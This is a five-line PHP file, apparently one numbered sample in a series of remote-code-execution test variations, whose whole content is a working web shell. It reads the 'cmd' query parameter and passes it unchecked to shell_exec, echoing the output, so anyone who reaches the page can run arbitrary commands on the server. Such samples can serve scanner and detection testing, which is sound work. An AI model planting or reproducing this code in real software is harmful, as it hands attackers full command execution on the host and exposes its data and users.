<?php
// RCE test variation #591
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>